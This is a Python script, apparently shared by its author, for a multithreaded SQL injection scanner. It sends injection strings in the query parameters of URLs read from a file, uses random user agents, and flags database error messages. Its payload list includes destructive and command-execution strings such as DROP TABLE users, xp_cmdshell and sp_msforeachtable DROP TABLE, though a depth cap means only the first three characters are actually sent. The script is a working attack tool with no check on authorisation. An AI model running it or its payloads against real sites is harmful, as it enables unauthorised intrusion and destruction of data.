#!/bin/python
# code by :  Mr - Dark
# twiter  :  @Mr_Dark55

import requests
import certifi
from termcolor import colored
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import json
from datetime import datetime
from fake_useragent import UserAgent
import pyfiglet
from multiprocessing import Value, Lock

# logo 
def display_logo():
    logo = pyfiglet.figlet_format("SQLInjector")
    print(colored(logo, 'cyan'))
    version = "v 0.1 "
    print(colored(version.center(len(logo.split("\n")[0])), 'cyan'))
    d = "twitter : @Mr_Dark55"
    print(colored(d.center(len(logo.split("\n")[0])), 'green')) 
    print("\n")

# UserAgent
ua = UserAgent()

# A list of common mistakes related to SQL
sql_errors = [
    "SQL syntax", "MySQL server has gone away", "SQLSTATE", "SQL Error",
    "ORA-", "PLS-", "PostgreSQL ERROR", "SQLite3::SQLException",
    "ODBC SQL Server Driver", "Microsoft SQL Native Client error",
    "Unclosed quotation mark after the character string", "Warning: mysql_", 
    "Warning: pg_", "You have an error in your SQL syntax", 
    "supplied argument is not a valid MySQL result resource",
    "SQL query failed", "unterminated quoted string at or near", 
    "syntax error at or near", "unexpected end of SQL command", 
    "Warning: odbc_exec()", "Microsoft OLE DB Provider for SQL Server error",
    "Invalid query", "Unterminated string constant", "quoted string not properly terminated",
    "SQLServerException", "ORA-00933", "ORA-01400", "ORA-01858", "ORA-01756",
    "Error converting data type", "Incorrect syntax near"
]

# List of injection patterns
injection_patterns = [
    "'", '"', ".", "/", ",", ":", ";", "-", "()", "*", "&", "$", "%",
    " OR 1=1", " UNION SELECT ", " AND 1=1", " ORDER BY 1--",
    "admin'--", "1' OR '1'='1", "1 UNION SELECT 1,2,3--",
    "1' AND '1'='1", "' OR 'a'='a", "';--", "'; DROP TABLE users;--",
    "'; EXEC xp_cmdshell('dir');--", "' OR '1'='1' --", "' OR 'x'='x'",
    "' OR ''='", "' OR '1'='1' --+- ", "admin' OR 1=1", "admin' --",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "'; EXEC sp_msforeachtable 'DROP TABLE ?'--",
    "' AND 1=2 UNION SELECT 1, 'anotheruser', 'doesntmatter', 1--"
]

def get_random_user_agent():
    return ua.random

def check_sql_error(url, timeout=10):
    try:
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(url, headers=headers, verify=certifi.where(), timeout=timeout)
        for error in sql_errors:
            if error in response.text:
                return error
        return None
    except requests.exceptions.RequestException:
        return None

def inject_and_check(url, depth=1, output_file=None, lock=None):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    results = []
    
    for param in query_params:
        for pattern in injection_patterns[:depth]:
            original_value = query_params[param][0]
            injected_value = original_value + pattern
            query_params[param] = [injected_value]

            injected_query = urlencode(query_params, doseq=True)
            injected_url = urlunparse(parsed_url._replace(query=injected_query))

            print(colored(f"[*] Testing {injected_url}", 'magenta'))

            error = check_sql_error(injected_url)
            if error:
                result = {
                    "url": url,
                    "parameter": param,
                    "pattern": pattern,
                    "error": error
                }
                results.append(result)
                print(colored(f"[!] Potential SQL Injection vulnerability detected:", 'red'))
                print(colored(f"    URL: {injected_url}", 'red'))
                print(colored(f"    Parameter: {param}", 'red'))
                print(colored(f"    Pattern: {pattern}", 'red'))
                print(colored(f"    Error: {error}", 'red'))

                # Save result immediately
                if output_file:
                    with lock:
                        with open(output_file, 'a') as f:
                            json.dump(result, f)
                            f.write(',\n')

            query_params[param] = [original_value]

    return results

def process_url(url, depth, ignore_errors, output_file, lock, scanned_urls, vulnerable_urls):
    try:
        results = inject_and_check(url, depth, output_file, lock)
        with lock:
            scanned_urls.value += 1
            vulnerable_urls.value += len(results) > 0
        return results
    except Exception:
        with lock:
            scanned_urls.value += 1
        if not ignore_errors:
            print(colored(f"[!] Error processing URL: {url}", 'red'))
        return []

def check_urls_from_file(file_path, output_file, threads=5, depth=1, ignore_errors=False):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file if line.strip()]

    lock = Lock()
    scanned_urls = Value('i', 0)
    vulnerable_urls = Value('i', 0)

    if output_file:
        with open(output_file, 'w') as f:
            f.write('[\n')  # Start of JSON array

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {executor.submit(process_url, url, depth, ignore_errors, output_file, lock, scanned_urls, vulnerable_urls): url for url in urls}
        for future in as_completed(future_to_url):
            future.result()

    if output_file:
        with open(output_file, 'a') as f:
            f.seek(f.tell() - 2, 0)  # Remove the last comma and newline
            f.write('\n]\n')  # End of JSON array

    return scanned_urls.value, vulnerable_urls.value

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Vulnerability Scanner")
    parser.add_argument("-u", "--urls-file", required=True, help="Path to the file containing URLs")
    parser.add_argument("-o", "--output", help="Output file to save results (JSON format)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to use")
    parser.add_argument("-d", "--depth", type=int, default=1, help="Depth of injection patterns to test (1-3)")
    parser.add_argument("--ignore-errors", action="store_true", help="Ignore connection errors and continue scanning")
    args = parser.parse_args()

    display_logo()
    print(colored("[*] Starting SQL Injection scan...", 'cyan'))
    print ('\n')
    start_time = datetime.now()
    
    total_scanned, total_vulnerable = check_urls_from_file(args.urls_file, args.output, args.threads, min(args.depth, 3), args.ignore_errors)
    
    end_time = datetime.now()

    print(colored(f"\n[*] Scan completed in {end_time - start_time}", 'green'))
    print(colored(f"[*] Total URLs scanned: {total_scanned}", 'green'))
    print(colored(f"[*] Total vulnerable URLs found: {total_vulnerable}", 'green'))

    if args.output:
        print(colored(f"[*] Results saved to: {args.output}", 'green'))
